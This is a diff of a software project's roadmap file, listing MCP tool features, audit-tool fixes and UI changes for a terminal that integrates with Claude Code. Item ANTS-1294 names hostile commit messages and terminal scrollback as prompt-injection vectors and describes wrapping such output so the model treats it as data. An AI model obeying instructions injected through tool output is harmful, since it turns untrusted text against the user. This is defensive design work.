   Source: in-session-2026-05-15 (self-observed during
   the ANTS-1355 / 1396 / 1395 bundle).
 
-- ✅ [ANTS-1399] **`tool_info(name)` MCP verb — fetch a
-  single tool's descriptor.** Shipped 2026-05-16 (Bundle C
+- ✅ [ANTS-1399] **`tool_info(name)` MCP verb — fetch a single tool's descriptor.** Shipped 2026-05-16 (Bundle C
   pull 3). New inline-dispatched MCP verb returns one
   descriptor slice (`{ok, name, description, inputSchema}`)
   from a lazy `m_lastToolsList` snapshot populated at
@@ -13365,8 +13216,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Kind: implement.
   Source: in-session-2026-05-15 (follow-up to ANTS-1396).
 
-- ✅ [ANTS-1401] **Central `ResolvedRoot` helper for the
-  `caller_cwd` convention.** Shipped 2026-05-16 (Bundle B pull
+- ✅ [ANTS-1401] **Central `ResolvedRoot` helper for the `caller_cwd` convention.** Shipped 2026-05-16 (Bundle B pull
   1). New header `src/resolvedroot.h` defines
   `ants::ResolvedRoot { QString cwd; Source { ExplicitMatch,
   EmptyFallback, NoMatch, Unresolvable }; std::optional<int>
@@ -13392,8 +13242,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Source: in-session-2026-05-15 (self-observed during
   the ANTS-1396 audit).
 
-- ✅ [ANTS-1402] **Share per-call observation point between
-  `mcp_trace` and `token_usage`.** Shipped 2026-05-16
+- ✅ [ANTS-1402] **Share per-call observation point between `mcp_trace` and `token_usage`.** Shipped 2026-05-16
   (Bundle C pull 4). New `ClaudeIntegration::recordDispatch`
   hook tees the same `argBytes` / `outBytes` / `wrapBytes` /
   `durUs` / `cachedHit` to both `m_tokenUsage.recordCall`
@@ -13425,8 +13274,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Source: in-session-2026-05-15 (self-observed while
   shipping ANTS-1355 v2).
 
-- 📋 [ANTS-1403] **Wrap-overhead framing compression — v3
-  on ANTS-1294.** With ANTS-1355 v2 shipped, the
+- 📋 [ANTS-1403] **Wrap-overhead framing compression — v3 on ANTS-1294.** With ANTS-1355 v2 shipped, the
   `total_wrap_bytes` envelope field now exposes how much of
   cumulative `bytes_out` is `<ants_mcp_data tool="…">…
   </ants_mcp_data>` framing rather than payload. Decision
@@ -13472,9 +13320,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   ANTS-1355 v2's spec § 8 / § 9); 2026-05-16 measurement
   recorded at Bundle C closeout.
 
-- ✅ [ANTS-1404] **Cross-project isolation Phase 3a —
-  per-tool `caller_cwd` contract audit + fail-loud policy
-  on absent caller_cwd.** Shipped 2026-05-16 (Bundle B pull
+- ✅ [ANTS-1404] **Cross-project isolation Phase 3a — per-tool `caller_cwd` contract audit + fail-loud policy on absent caller_cwd.** Shipped 2026-05-16 (Bundle B pull
   3). New `CallerCwdContract` enum in claudeintegration.h
   classifies every MCP tool into one of four categories:
   Required, Optional, TabSpecific, ProcessGlobal. Phase 3a
@@ -13507,8 +13353,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   instance — broadens the ANTS-1396 fix to cover the
   absent-caller_cwd case, not just the mismatched case).
 
-- ✅ [ANTS-1405] **`roadmap_query` parser handles
-  non-Ants project stable-ID formats.** Shipped
+- ✅ [ANTS-1405] **`roadmap_query` parser handles non-Ants project stable-ID formats.** Shipped
   2026-05-17 (Bundle E pull 1). `RoadmapDialog::parseBullets`
   regex widened from `\[ANTS-(\d+)\]` to
   `\[([A-Za-z][A-Za-z0-9_-]*-\d+)\]` and `rec.id` now
@@ -13544,8 +13389,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   Source: cross-session-report-2026-05-15 (other CC
   instance running on MAME Curator project).
 
-- ✅ [ANTS-1406] **`last_audit_summary` `since_commit`
-  short-circuit — option (a) shipped 2026-05-19 (pull 31).**
+- ✅ [ANTS-1406] **`last_audit_summary` `since_commit` short-circuit — option (a) shipped 2026-05-19 (pull 31).**
   Added a `since_commit` schema property (`type:"string"`) and
   the matching short-circuit gate in `cmdLastAuditSummary`.
   When the caller passes their HEAD SHA, the server compares
@@ -13623,8 +13467,7 @@ ops; the residual read-path is intentional per ANTS-1372 INV-7
   instance — ~50 K tokens × 30 closes/month/project
   ≈ ~1.5 M tokens/month/project on clean closes).
 
-- ✅ [ANTS-1407] **Tasks chip / Task List dialog drift
-  from CC session's inline view.** Shipped 2026-05-16
+- ✅ [ANTS-1407] **Tasks chip / Task List dialog drift from CC session's inline view.** Shipped 2026-05-16
   (Bundle F pull 1). Three textual changes in
   `parseTranscript` so the chip mirrors what CC's inline
   view shows: (1) empty `TodoWrite { todos: [] }` no
@@ -14638,8 +14481,7 @@ own design + test cycles.
   Source: indie-review-2026-05-13.
   Re-confirmed deferred (2026-06-28): the architectural blocker still holds — grep of src/claudeintegration.h shows ClaudeTabTracker referenced only in comments, with no tracker member/pointer on ClaudeIntegration (which owns the single shared hook UDS). So the session_id→shell cross-check (shellForSessionId) still has no path to the hook owner without threading a ClaudeTabTracker* into it — the same hot hook-routing change the 2026-05-25 note flagged. Mitigations unchanged and intact (SO_PEERCRED same-UID gate, isFocusedTabSession per-event gate, cold-start drop). Left planned for a focused session that can wire the tracker pointer + add a feature test on the gate.
 
-- ✅ [ANTS-1273] **`/tmp/ants-terminal-<uid>.sock` fallback TOCTOU
-  (remotecontrol).** `src/remotecontrol.cpp:82`. The XDG-runtime-dir
+- ✅ [ANTS-1273] **`/tmp/ants-terminal-<uid>.sock` fallback TOCTOU (remotecontrol).** `src/remotecontrol.cpp:82`. The XDG-runtime-dir
   path is 0700 and safe; the `/tmp` fallback in `defaultSocketPath`
   lives in shared `/tmp`, so a same-UID attacker can race the
   `safeToUnlinkLocalSocket` → `removeServer` → `listen` window.
@@ -14669,8 +14511,7 @@ own design + test cycles.
   Kind: review-fix.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1274] **ripgrep `--glob` `!` prefix + gitignore-style escape
-  (remotecontrol).** `src/remotecontrol.cpp:748`. `workspace-search`
+- ✅ [ANTS-1274] **ripgrep `--glob` `!` prefix + gitignore-style escape (remotecontrol).** `src/remotecontrol.cpp:748`. `workspace-search`
   forwards `glob` as a single argv to `rg --glob` with only a `..`
   substring filter + 256-byte cap. Leading `!` flips the meaning
   (negation), and ripgrep's gitignore-style globs differ from POSIX
@@ -14683,8 +14524,7 @@ own design + test cycles.
   Source: indie-review-2026-05-13.
   Resolved (2026-06-27): workspace-search glob validation now rejects a leading '!' (negation) — the one gitignore-glob shape that can un-exclude an ignored tree (precedence above .gitignore). remotecontrol.cpp. The broad meta-allowlist from the finding was deliberately NOT added: it would reject legitimate brace/charclass globs, and '!' is the actual resurrection vector.
 
-- ✅ [ANTS-1275] **Preamble prose hidden on every preset
-  (roadmapdialog).** `src/roadmapdialog.cpp:1497`. `renderCardsHtml`
+- ✅ [ANTS-1275] **Preamble prose hidden on every preset (roadmapdialog).** `src/roadmapdialog.cpp:1497`. `renderCardsHtml`
   initialises `sectionVisible=true`, `sectionExpanded=false`; preamble
   prose before the first `## ` is gated on `sectionExpanded` and
   silently dropped — including on the Full preset where R23 / §4.1
@@ -14752,8 +14592,7 @@ own design + test cycles.
   Kind: review-fix.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1269] **`isCatastrophicRegex` overpromise — alternation +
-  backreferences (auditengine + auditdialog).** `src/auditengine.cpp:25`.
+- ✅ [ANTS-1269] **`isCatastrophicRegex` overpromise — alternation + backreferences (auditengine + auditdialog).** `src/auditengine.cpp:25`.
   Header docstring claims to catch "alternation under a quantifier
   `(a|b)+`" plus backreference patterns; the regex
   `\([^()]*[+*][^()]*\)[?*+]` only catches nested quantifiers like
@@ -14782,8 +14621,7 @@ own design + test cycles.
   Source: indie-review-2026-05-13.
   Resolved (2026-06-27): lineIsCode dispatches the comment/string lexer on file extension — # comments (Python/shell/Ruby/YAML/TOML/CMake/Makefile/Dockerfile), Lua -- and [[ ]] long brackets, Python triple-quotes. The bare comment-introducer no longer reads as code. auditdialog.cpp. Follow-up: a direct regression test needs lineIsCode promoted to a testable surface (it is a private GUI method); logged separately.
 
-- ✅ [ANTS-1271] **Path-rule glob normalisation vs absolute paths
-  (auditdialog).** `src/auditdialog.cpp:2216`. `globToRegex("tests/
+- ✅ [ANTS-1271] **Path-rule glob normalisation vs absolute paths (auditdialog).** `src/auditdialog.cpp:2216`. `globToRegex("tests/
   audit_fixtures/**")` emits `^tests/audit_fixtures/.*$`. Scanners
   emitting absolute paths (clang-tidy, semgrep, mypy on cross-cwd
   inputs) produce `Finding::file == "/home/user/proj/tests/…"`;
@@ -14797,8 +14635,7 @@ own design + test cycles.
   Source: indie-review-2026-05-13.
   Resolved (2026-06-27): applyPathRules normalises Finding::file to project-relative before matching, so absolute-path findings (clang-tidy/semgrep/mypy on cross-cwd inputs) match the relative globs. auditdialog.cpp.
 
-- ✅ [ANTS-1272] **Wire or delete `detectProjectFrameworks`
-  (audit-support).** `src/audithygiene.cpp:119`. `detectProjectFrameworks`
+- ✅ [ANTS-1272] **Wire or delete `detectProjectFrameworks` (audit-support).** `src/audithygiene.cpp:119`. `detectProjectFrameworks`
   + `semgrepRulePacks` ship as binary weight + green tests but
   have ZERO production callers. The function is exercised only by
   `tests/features/audit_framework_detect/`; framework auto-detection
@@ -14814,8 +14651,7 @@ own design + test cycles.
 
 #### ⚡ Tier 3 — perf / refactor / a11y
 
-- ✅ [ANTS-1262] **Move `computeConfidence` to `AuditEngine`
-  (auditengine + auditdialog).** `src/auditdialog.cpp:2351`. The
+- ✅ [ANTS-1262] **Move `computeConfidence` to `AuditEngine` (auditengine + auditdialog).** `src/auditdialog.cpp:2351`. The
   confidence-score formula lives in the dialog despite being pure
   data-transform with no widget dependency. Non-GUI consumers
   (ants-helper, MCP `last_audit_summary`, future CI runners) either
@@ -14828,8 +14664,7 @@ own design + test cycles.
   Source: indie-review-2026-05-13.
   Resolved (2026-06-27): computeConfidence moved to AuditEngine::computeConfidence (non-GUI lib, single source of truth, no Qt6::Widgets); AuditDialog::computeConfidence now forwards so the 3 call-sites + public static surface are unchanged. auditengine.{h,cpp} + auditdialog.cpp.
 
-- 📋 [ANTS-1263] **Delete dead `renderHtml` v1 + retest
-  (roadmapdialog).** `src/roadmapdialog.cpp:684`. CLAUDE.md claims
+- 📋 [ANTS-1263] **Delete dead `renderHtml` v1 + retest (roadmapdialog).** `src/roadmapdialog.cpp:684`. CLAUDE.md claims
   `renderHtml` is "kept for tests + the `roadmap-query` IPC verb
   consumers" — but `grep -rn renderHtml src/` returns ZERO non-test
   callers (`remotecontrol.cpp:611` uses `parseBullets`, not
@@ -14844,8 +14679,7 @@ own design + test cycles.
   Source: indie-review-2026-05-13.
   Progress (2026-06-27): confirmed renderHtml v1 has ZERO production callers — every reference is in tests/specs (the spec itself already documents it as "test-only since ANTS-1747"). remotecontrol's roadmap-query path uses parseBullets, not renderHtml. So the CLAUDE.md "IPC verb consumers" justification is indeed stale. Left planned: the delete-or-rename is NOT a quick win — it is a 318-line removal plus a rewrite of 4 feature-test suites (roadmap_viewer, roadmap_viewer_tabs, roadmap_kind_facets, roadmap_current_preset_excludes_shipped) whose locked INVs assert renderHtml's existence/signature/anchor-emission. Needs its own focused session to avoid destabilising the test corpus.
 
-- ✅ [ANTS-1264] **Implement INV-13 scroll-position persistence
-  (roadmapdialog).** `src/roadmapdialog.cpp:2206`. Spec ANTS-1154
+- ✅ [ANTS-1264] **Implement INV-13 scroll-position persistence (roadmapdialog).** `src/roadmapdialog.cpp:2206`. Spec ANTS-1154
   §3.5 / §4.5 (INV-13) requires the dialog to write the topmost
   visible card's `(sectionSlug, idIfAny, offsetPx)` to
   `Config::roadmapScrollAnchor[activeTab]` on close. The Config
@@ -14892,8 +14726,7 @@ own design + test cycles.
   Source: indie-review-2026-05-13.
   Resolved (2026-06-28) — already done, superseded. This 2026-05-13 item predates the optimisation it requested. Verified in src/terminalwidget.cpp: ANTS-1779 already hoisted the per-row run vector and the per-run codepoint buffer into mutable members m_paintRuns (std::vector<PaintTextRun>) + m_paintCps (std::vector<char32_t>), reused across rows AND frames via clear() (capacity retained); PaintTextRun now records its codepoints as a [cpStart, cpStart+cpLen) slice into the shared m_paintCps arena rather than owning a nested vector (terminalwidget.h:665,675-676; terminalwidget.cpp:800-808). ANTS-1149 separately hoisted the QTextLayout (m_paintLayout member) out of the per-run loop. The only remaining std::vector in the paint loop (PaintHighlightSpan `computed`, terminalwidget.cpp:775) is allocated on a highlight-cache MISS only, then moved into m_hlSpanCache — not per-frame. No per-row/per-frame heap churn remains. No code change made: churning a hot, already-optimised paint path would be redundant (the item's own caveat was 'measure perf-overlay delta first' — there is no delta to capture).
 
-- 📋 [ANTS-1277] **Keyboard nav + aria-expanded on collapsible
-  cards (roadmapdialog).** `src/roadmapdialog.cpp:1888`. The dialog
+- 📋 [ANTS-1277] **Keyboard nav + aria-expanded on collapsible cards (roadmapdialog).** `src/roadmapdialog.cpp:1888`. The dialog
   binds `/`, `?`, `Esc`, `F5`, `Ctrl+C/A`, arrows, `PgUp/Dn`,
   `Home/End`, `Tab` — but there is NO keyboard path to expand a
   focused card or section, defeating R20 + R23 (partially-sighted
@@ -14911,8 +14744,7 @@ own design + test cycles.
 
 #### 🧰 Tooling — surfaced during this fold-in
 
-- ✅ [ANTS-1278] **`indie_review_fold_in` MCP renderer emits
-  placeholder bullets + duplicate `Lanes:` line.** Surfaced
+- ✅ [ANTS-1278] **`indie_review_fold_in` MCP renderer emits placeholder bullets + duplicate `Lanes:` line.** Surfaced
   while folding this 2026-05-13 sweep into ROADMAP. The MCP tool
   `mcp__ants__indie_review_fold_in` correctly allocates IDs,
   bumps `.roadmap-counter`, and atomically inserts after the
@@ -15018,8 +14850,7 @@ The items below identify the next batch of leverage.
   duplicate it (CLAUDE.md §3 reuse-before-rewriting); closed without new
   code.
 
-- ✅ [ANTS-1281] **`indie_review_brief` returns manifest, not source
-  bodies** (shipped to `[Unreleased]` 2026-05-13 — first item of
+- ✅ [ANTS-1281] **`indie_review_brief` returns manifest, not source bodies** (shipped to `[Unreleased]` 2026-05-13 — first item of
   the post-0.7.91 cycle). The tool's response keeps the `brief`
   field (no rename — backwards compatible) but drops the per-file
   `=== file: <path> ===` body sections. New structured fields
@@ -15040,8 +14871,7 @@ The items below identify the next batch of leverage.
   Kind: refactor.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1282] **`indie_review_corroborate` accepts a directory
-  path** (shipped to `[Unreleased]` 2026-05-13). The tool now
+- ✅ [ANTS-1282] **`indie_review_corroborate` accepts a directory path** (shipped to `[Unreleased]` 2026-05-13). The tool now
   accepts EITHER `reports: {lane_name: report_markdown}` (v1
   inline) OR `reports_dir: <project-relative-path>` (v2 disk
   read). XOR-validated at the MCP handler layer. Engine adds
@@ -15131,8 +14961,7 @@ The items below identify the next batch of leverage.
 
 #### ⚡ Performance — non-MCP-but-related
 
-- 📋 [ANTS-1285] **Consolidate `claudetasklist` + `claudebgtasks`
-  `QFileSystemWatcher` instances.** Both trackers install a
+- 📋 [ANTS-1285] **Consolidate `claudetasklist` + `claudebgtasks` `QFileSystemWatcher` instances.** Both trackers install a
   separate watcher on the SAME transcript path; on tab switch we
   pay the watcher-add/remove cost twice and the kernel fires two
   notifications per file change. After ANTS-1261 extracts a shared
@@ -15198,8 +15027,7 @@ The items below identify the next batch of leverage.
 
 #### 🔌 MCP — skill displacement (moving workflow tokens server-side)
 
-- ✅ [ANTS-1319] **`/cold-eyes` MCP fold-in — mechanical doc-walk
-  + cross-doc diff server-side.** Mirror to ANTS-1112 (folded
+- ✅ [ANTS-1319] **`/cold-eyes` MCP fold-in — mechanical doc-walk + cross-doc diff server-side.** Mirror to ANTS-1112 (folded
   `/indie-review`) and ANTS-1113 (folded `/debt-sweep`). The
   `superpowers:cold-eyes` skill today drives Claude through a
   parallel multi-agent loop: dispatch N agents reading
@@ -15247,8 +15075,7 @@ the skill's core loop is "run X, parse Y, return Z" or "render this
 template / mutate this state atomically" → movable. If it's
 "hypothesise, ask user, narrow down" → not movable.
 
-- ✅ [ANTS-1289] **`mcp__ants__verify_changes` — host the
-  `verification-before-completion` skill server-side.** That skill's
+- ✅ [ANTS-1289] **`mcp__ants__verify_changes` — host the `verification-before-completion` skill server-side.** That skill's
   core loop is mechanical: run the project's build + test + lint
   commands, return `{build: pass|fail, tests: <pass>/<total>,
   failing_tests:[], lint: pass|fail, errors_excerpt: <tail>}`. No
@@ -15264,8 +15091,7 @@ template / mutate this state atomically" → movable. If it's
   Kind: implement.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1290] **`mcp__ants__plan_template` — host the
-  `writing-plans` skill's template emission.** That skill mostly
+- ✅ [ANTS-1290] **`mcp__ants__plan_template` — host the `writing-plans` skill's template emission.** That skill mostly
   emits a structured "Goal / Steps / Verify each step / Tests"
   template that Claude then fills in. Move the template emission
   server-side: tool returns the skeleton + the project-specific
@@ -15308,8 +15134,7 @@ template / mutate this state atomically" → movable. If it's
 
 #### 🔌 MCP — context-loading discipline
 
-- ✅ [ANTS-1292] **Split CLAUDE.md: core (always-loaded) vs lane
-  details (on-demand via `subsystem` MCP).** CLAUDE.md is loaded
+- ✅ [ANTS-1292] **Split CLAUDE.md: core (always-loaded) vs lane details (on-demand via `subsystem` MCP).** CLAUDE.md is loaded
   every Claude session and is ~330 lines and growing. The "Module
   map (src/)" subsection alone is ~130 lines of lane summaries —
   exactly the data `mcp__ants__subsystem op=map` returns on
@@ -15351,8 +15176,7 @@ template / mutate this state atomically" → movable. If it's
 
 #### 🔒 MCP — security hardening (token-economy adjacent)
 
-- ✅ [ANTS-1294] **MCP output sanitisation — frame user-supplied
-  text as data, not instructions.** Multiple MCP tools return
+- ✅ [ANTS-1294] **MCP output sanitisation — frame user-supplied text as data, not instructions.** Multiple MCP tools return
   text that originates from untrusted sources: `get_text` from
   PTY scrollback, `roadmap_query` from ROADMAP.md, `git_state`
   from commit messages. A hostile commit message
@@ -15372,8 +15196,7 @@ template / mutate this state atomically" → movable. If it's
   Kind: security.
   Source: indie-review-2026-05-13.
 
-- ✅ [ANTS-1295] **Per-tool cwd-anchor enforcement on
-  path-accepting MCP tools.** `file_outline`, `workspace_search`,
+- ✅ [ANTS-1295] **Per-tool cwd-anchor enforcement on path-accepting MCP tools.** `file_outline`, `workspace_search`,
   `git_state` accept `path` parameters. The `git_state`
   `validatePath` helper anchors against `rootCanonical`; verify
   every path-accepting tool does the same and add a central
@@ -15417,8 +15240,7 @@ template / mutate this state atomically" → movable. If it's
   CallerCwdContract entry, test, and external caller for zero remaining
   benefit. User-confirmed close 2026-05-25.
 
-- ✅ [ANTS-1297] **Lazy MCP tool registration (`tools/list` returns
-  namespace summaries, expand on demand).** Pairs with ANTS-1296.
+- ✅ [ANTS-1297] **Lazy MCP tool registration (`tools/list` returns namespace summaries, expand on demand).** Pairs with ANTS-1296.
   Today every Claude Code session enumerates ~30 tools via the MCP
   `tools/list` protocol; each description is loaded into the
   assistant's context unconditionally. Add a `--list-mode=summary`
@@ -15449,8 +15271,7 @@ template / mutate this state atomically" → movable. If it's
 
 #### 📦 Docs — user-facing surface
 
-- ✅ [ANTS-1298] **Rewrite README.md as a Claude Code companion,
-  user-friendly tone, token-savings front-and-centre.** The
+- ✅ [ANTS-1298] **Rewrite README.md as a Claude Code companion, user-friendly tone, token-savings front-and-centre.** The
   current README is 1072 lines, feature-list-heavy, written in
   developer-tools voice ("VT100 state machine", "QPainter +
   QTextLayout", "DCS parser"). Restructure to ~400–500 lines
@@ -15816,8 +15637,7 @@ template / mutate this state atomically" → movable. If it's
 
 ### 🎨 At-a-glance build-version surface (user request 2026-05-14)
 
-- ✅ [ANTS-1323] **`v0.7.92 · 2026-05-14 08:48` build-badge on
-  window title + status bar.** With the new weekly Wednesday
+- ✅ [ANTS-1323] **`v0.7.92 · 2026-05-14 08:48` build-badge on window title + status bar.** With the new weekly Wednesday
   cadence + rolling-RC cycle, the user couldn't tell which local
   rebuild they were running — multiple builds per day collapsed
   to the same `2026-05-14` date stamp. Fix: add `ANTS_BUILD_TIME`
@@ -15842,9 +15662,7 @@ template / mutate this state atomically" → movable. If it's
 
 ### 🔌 Ants-MCP discoverability — stale-socket sweep (user request 2026-05-14)
 
-- ✅ [ANTS-1322] **Ants MCP unreachable from user-scope sessions —
-  stale `/tmp/ants-terminal-mcp-<PID>` sockets accumulated from
-  crashed instances.** The MCP server is already registered at
+- ✅ [ANTS-1322] **Ants MCP unreachable from user-scope sessions — stale `/tmp/ants-terminal-mcp-<PID>` sockets accumulated from crashed instances.** The MCP server is already registered at
   `claude mcp` user scope (visible to all projects via the
   `mcp-bridge.py` stdio→Unix-socket bridge), but kept failing to
   connect with `Failed to connect`. Root cause: every crashed
@@ -15870,8 +15688,7 @@ template / mutate this state atomically" → movable. If it's
 
 ### 🔌 Ants-MCP follow-ups from ANTS-1356 + RetroDB cross-session reports (2026-05-17)
 
-- ✅ [ANTS-1454] **ANTS-1404 `caller_cwd_required` refusal records
-  as `result="ok"`.** Surfaced during the ANTS-1356 cold-eyes review
+- ✅ [ANTS-1454] **ANTS-1404 `caller_cwd_required` refusal records as `result="ok"`.** Surfaced during the ANTS-1356 cold-eyes review
   (2026-05-17): the refusal branch at `claudeintegration.cpp:3431-3454`
   sets `toolHandled=true` then falls into the success
   `recordDispatch` call which today passes `dispatchResult`
@@ -15893,9 +15710,7 @@ template / mutate this state atomically" → movable. If it's
   Kind: fix.
   Source: cold-eyes-review-2026-05-17 (during ANTS-1356).
 
-- ✅ [ANTS-1455] **`test_audit_*` MCP surface — usability gaps
-  surfaced by RetroDB CC session (cross-session reports
-  2026-05-17).** Three friction points reported in quick
+- ✅ [ANTS-1455] **`test_audit_*` MCP surface — usability gaps surfaced by RetroDB CC session (cross-session reports 2026-05-17).** Three friction points reported in quick
   succession while running `/test-audit` on a Flask app:
   - **(a) `test_audit_partition` walks the whole project by
     default** instead of respecting `test_globs`. Reporter
@@ -15944,8 +15759,7 @@ template / mutate this state atomically" → movable. If it's
   not *missing*) and (c) `mode:"summary"|"full"` arg shape +
   multi-line output for grep-debuggability.
 
-- ✅ [ANTS-1456] **`audit_run` v1 usability gaps surfaced
-  by RetroArch CC session (cross-session report 2026-05-17).**
+- ✅ [ANTS-1456] **`audit_run` v1 usability gaps surfaced by RetroArch CC session (cross-session report 2026-05-17).**
   Three friction points reported while running `mcp__ants__audit_run`
   against RetroArch (flat-layout C project — no `src/` subdir,
   source under `gfx/`, `audio/`, `network/`, … directly at repo root):
@@ -15985,9 +15799,7 @@ template / mutate this state atomically" → movable. If it's
   Source: cross-session-report-2026-05-17 (RetroArch CC instance
   running `audit_run` against a flat-layout C project).
 
-- ✅ [ANTS-1459] **`roadmap_query` + `last_audit_summary` discovery
-  is too narrow for projects that don't put files at the repo
-  root.** Cross-session report from a RetroArch CC instance running
+- ✅ [ANTS-1459] **`roadmap_query` + `last_audit_summary` discovery is too narrow for projects that don't put files at the repo root.** Cross-session report from a RetroArch CC instance running
   against `/mnt/Games/Scripts/Linux/RetroArch` 2026-05-17:
   - **(a) `roadmap_query` returned `no_roadmap_loaded`** despite
     the project keeping its roadmap at `docs/private/ROADMAP.md`
@@ -16028,8 +15840,7 @@ template / mutate this state atomically" → movable. If it's
   Source: cross-session-report-2026-05-17 (RetroArch CC instance
   on `/mnt/Games/Scripts/Linux/RetroArch`).
 
-- ✅ [ANTS-1458] **Tasks chip + Task List dialog refresh
-  latency.** User-observed 2026-05-17 20:36 (screenshot in
+- ✅ [ANTS-1458] **Tasks chip + Task List dialog refresh latency.** User-observed 2026-05-17 20:36 (screenshot in
   `/home/ants/Pictures/ClaudePaste/paste_20260517_204727_235_*.png`):
   multiple `TaskCreate` events appended to the active Claude
   Code transcript took longer than the documented 2-second
@@ -16083,9 +15894,7 @@ template / mutate this state atomically" → movable. If it's
   Spec docs/specs/ANTS-1458.md §2.5. Incremental-parse fast-path
   (parse cost) remains deferred to phase 3.
 
-- ✅ [ANTS-1457] **False-positive ledger
-  (`.ants_review_falsepos.jsonl`) shared across `/audit`,
-  `/cold-eyes`, `/indie-review`, `/test-audit`.** New project-level
+- ✅ [ANTS-1457] **False-positive ledger (`.ants_review_falsepos.jsonl`) shared across `/audit`, `/cold-eyes`, `/indie-review`, `/test-audit`.** New project-level
   standard at `docs/standards/audit-false-positives.md` defines an
   append-only JSONL ledger at repo root that CC sessions write when
   a finding is classified `FALSE_POSITIVE` during fold-in. The
@@ -16681,8 +16490,7 @@ template / mutate this state atomically" → movable. If it's
   Lanes: mcp-token-reduction, mcp-audit-run, auditrunner.
   Source: in-session-2026-05-18 (token-saving brainstorm).
 
-- ✅ [ANTS-1870] **`audit_run` precise since-last-run delta +
-  carry-forward SARIF merge (the deferred half of ANTS-1504).**
+- ✅ [ANTS-1870] **`audit_run` precise since-last-run delta + carry-forward SARIF merge (the deferred half of ANTS-1504).**
   ANTS-1504 ships the file-narrowing but NOT the
   `delta:{added, removed, carried_forward}` envelope or the carry-forward
   merge (prior findings on untouched files folded into the new SARIF),
@@ -18978,8 +18786,7 @@ template / mutate this state atomically" → movable. If it's
 
 ### 🔌 Ants-MCP discoverability — tool-selection guidance (cross-session report 2026-05-17)
 
-- ✅ [ANTS-1453] **Per-tool "use this when..." selection hint on
-  every MCP descriptor.** Cross-session report 2026-05-17: a
+- ✅ [ANTS-1453] **Per-tool "use this when..." selection hint on every MCP descriptor.** Cross-session report 2026-05-17: a
   Claude Code session on a Flask app (~25 K LOC) triaged a "Scan
   Library doesn't pick up new games" bug. The keyword path was
   direct enough that vanilla `Grep` + `Read` resolved it in ~10
@@ -19064,8 +18871,7 @@ on roadmap); Music_Production + RetroArch surfaced four small
 follow-ups below. Items ordered by severity within this
 subsection.
 
-- ✅ [ANTS-1690] **`roadmap_log op:flip_batch` for closing N
-  bullets atomically.** Fold-in bundles routinely close 5-15
+- ✅ [ANTS-1690] **`roadmap_log op:flip_batch` for closing N bullets atomically.** Fold-in bundles routinely close 5-15
   bullets in lockstep (cold-eyes / indie-review / test-audit
   sweeps). Per-bullet `op:flip` calls force N round-trips; the
   reporting session fell back to `sed -i '455,463 s/^- 📋 /- ✅
@@ -19096,9 +18902,7 @@ subsection.
   bundle 71); refined 2026-05-20 (bundles 73-75).
   Shipped 2026-05-25. roadmap_log op:"flip_batch" — flips N bullets to one to_status in a single read + single QSaveFile commit. Locators: id|anchor|headline|line_range, each with optional per-locator note + no_anchor opt-out; partial success via skipped[]. Applies in descending line order so per-locator note inserts never shift not-yet-applied targets (index stability). GFM anchor injection consumes .roadmap-counter exactly once across the batch. remotecontrol.cpp cmdRoadmapLogFlipBatch + 8 behavioural tests (tests/features/roadmap_log_flip_batch). The flip_batch annotate suffix the report asked for is the per-locator `note`.
 
-- ✅ [ANTS-1688] **`roadmap_query mode:"section_index"` payload
-  shrink for legacy-format roadmaps with many duplicate-ID
-  occurrences.** On a 456 KB ROADMAP from a sibling project,
+- ✅ [ANTS-1688] **`roadmap_query mode:"section_index"` payload shrink for legacy-format roadmaps with many duplicate-ID occurrences.** On a 456 KB ROADMAP from a sibling project,
   `mode:"section_index"` returned a 54.9 KB envelope dominated
   by `duplicate_ids[].occurrences[]` — each legacy non-ID
   bullet (Phase 9F-1, Photo mode, …) surfaced with up to 8
@@ -19136,8 +18940,7 @@ subsection.
   1449/1449 ctest.
   Still observable on RetroDB through v3.6.34 (4 sessions 2026-06-05). Root cause pinned: the ID normaliser strips the trailing `.<LETTER>` sub-pass suffix before de-duping, so (a) parent vs sub-pass (`41.5` vs `41.5.B`) and (b) an Active-section headline vs its Done-index `[x]` checkbox mirror each collapse to one base ID — producing the false PASS-47-6 / 41-5 / 41-6 / 41-13 set. Each `#### Pass` heading appears once on disk. Refinement: treat the `.<LETTER>` sub-pass suffix as part of the ID (`41.5` ≠ `41.5.B`) and don't count an Active headline + its Done-index checkbox as two occurrences.
 
-- ✅ [ANTS-1689] **`test_audit_synthesis_prompt` markdown
-  `[SEVERITY]` fallback parser.** ANTS-1617 (pull 18) taught the
+- ✅ [ANTS-1689] **`test_audit_synthesis_prompt` markdown `[SEVERITY]` fallback parser.** ANTS-1617 (pull 18) taught the
   parser to recognise `### [SEVERITY] dimension:` headers + a
   `## Findings (JSON)` block, but chunk subagents emitting prose-
   style markdown (the default `/test-audit` flow) still produce
@@ -30506,8 +30309,7 @@ GUI/PTY end to end. Item 2 depends on item 1.
 
 ### 🐛 Close-time crash + theme-change UB (ASan-confirmed 2026-05-13)
 
-- ✅ [ANTS-1329] **Tasks dialog gets 3 px of vertical row
-  spacing for readability** (shipped 2026-05-14). User feedback
+- ✅ [ANTS-1329] **Tasks dialog gets 3 px of vertical row spacing for readability** (shipped 2026-05-14). User feedback
   after ANTS-1328 (word-wrap): "Can you add a little line spacing
   between items, just to separate them please." Shipped first as
   `QListWidget::setSpacing(6)` (12 px gap); user-tuned same day
@@ -30522,8 +30324,7 @@ GUI/PTY end to end. Item 2 depends on item 1.
   Kind: feature.
   Source: user-feedback-2026-05-14.
 
-- ✅ [ANTS-1328] **Tasks dialog wraps long task subjects, no
-  horizontal scrollbar** (shipped 2026-05-14). User feedback
+- ✅ [ANTS-1328] **Tasks dialog wraps long task subjects, no horizontal scrollbar** (shipped 2026-05-14). User feedback
   2026-05-14: "Can we also display the text in an easier to read
   fashion? Perhaps add wrapping so users don't have to scroll
   left and right." Previously the dialog's `QListWidget` used
@@ -30544,8 +30345,7 @@ GUI/PTY end to end. Item 2 depends on item 1.
   Kind: feature.
   Source: user-feedback-2026-05-14.
 
-- ✅ [ANTS-1327] **Tasks chip + dialog now mirror Claude Code's
-  sidebar — full session history across `/compact`** (shipped
